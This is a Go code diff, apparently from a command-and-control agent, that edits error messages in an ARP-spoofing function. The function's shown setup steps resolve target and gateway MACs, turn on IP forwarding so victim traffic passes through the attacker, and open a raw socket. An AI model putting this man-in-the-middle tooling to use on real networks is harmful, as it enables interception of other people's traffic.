@@ -22,17 +22,17 @@ import (
 func executeArpSpoof(task structs.Task) structs.CommandResult {
 	args, err := parseArpSpoofArgs(task.Params)
 	if err != nil {
-		return errorf("Error: failed to parse ARP spoof arguments: %v", err)
+		return errorf("failed to parse ARP spoof arguments: %v", err)
 	}
 
 	// Resolve target and gateway MAC addresses
 	targetMAC, err := resolveMAC(args.Target)
 	if err != nil {
-		return errorf("Error resolving target MAC: %v", err)
+		return errorf("resolving target MAC: %v", err)
 	}
 	gatewayMAC, err := resolveMAC(args.Gateway)
 	if err != nil {
-		return errorf("Error resolving gateway MAC: %v", err)
+		return errorf("resolving gateway MAC: %v", err)
 	}
 
 	// Get attacker's interface and MAC
@@ -40,25 +40,25 @@ func executeArpSpoof(task structs.Task) structs.CommandResult {
 	if ifaceName == "" {
 		ifaceName, err = getDefaultInterface()
 		if err != nil {
-			return errorf("Error detecting interface: %v", err)
+			return errorf("detecting interface: %v", err)
 		}
 	}
 	iface, err := net.InterfaceByName(ifaceName)
 	if err != nil {
-		return errorf("Error: interface %s: %v", ifaceName, err)
+		return errorf("interface %s: %v", ifaceName, err)
 	}
 	attackerMAC := iface.HardwareAddr
 
 	// Enable IP forwarding so traffic flows through us
 	prevForward, err := enableIPForwarding()
 	if err != nil {
-		return errorf("Error enabling IP forwarding: %v", err)
+		return errorf("enabling IP forwarding: %v", err)
 	}
 
 	// Open raw socket for sending ARP frames
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(etherTypeARP)))
 	if err != nil {
-		return errorf("Error opening raw socket: %v (requires root)", err)
+		return errorf("opening raw socket: %v (requires root)", err)
 	}
 	defer syscall.Close(fd)
 
@@ -147,7 +147,7 @@ cleanup:
 
 	output, err := json.Marshal(result)
 	if err != nil {
-		return errorf("Error: failed to marshal result: %v", err)
+		return errorf("failed to marshal result: %v", err)
 	}
 	return successResult(string(output))
 }
